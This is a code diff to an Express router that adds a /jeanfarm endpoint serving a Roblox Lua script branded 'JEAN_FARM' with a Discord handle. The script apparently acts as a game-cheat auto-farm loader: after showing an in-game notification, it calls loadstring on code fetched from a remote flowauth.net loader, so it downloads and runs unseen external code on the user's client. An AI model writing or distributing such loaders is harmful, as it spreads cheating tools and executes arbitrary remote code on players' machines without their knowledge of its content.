@@ -1403,4 +1403,43 @@ router.get("/benja", (_req, res) => {
   res.send(benjaScript(host));
 });
 
+// ── /api/jeanfarm ── JEAN_FARM | Wrapper con marca propia que ejecuta el farm externo (FlowAuth)
+const jeanFarmScript = `-- ═══════════════════════════════
+--        JEAN_FARM  |  jean14_17
+-- ═══════════════════════════════
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "JEAN_FARM",
+        Text = "Cargando script de farm...",
+        Duration = 4
+    })
+end)
+local ok, err = pcall(function()
+    loadstring(game:HttpGet("https://flowauth.net/v1/loaders/41db819e452a05ea0ac73509863082a4.lua", true))()
+end)
+if ok then
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification",{
+            Title = "JEAN_FARM",
+            Text = "Script cargado. Discord: jean14_17",
+            Duration = 5
+        })
+    end)
+else
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification",{
+            Title = "JEAN_FARM",
+            Text = "Error al cargar el farm: " .. tostring(err),
+            Duration = 8
+        })
+    end)
+end
+`;
+
+router.get("/jeanfarm", (_req, res) => {
+  res.setHeader("Content-Type", "text/plain");
+  res.setHeader("Cache-Control", "no-store");
+  res.send(jeanFarmScript);
+});
+
 export default router;
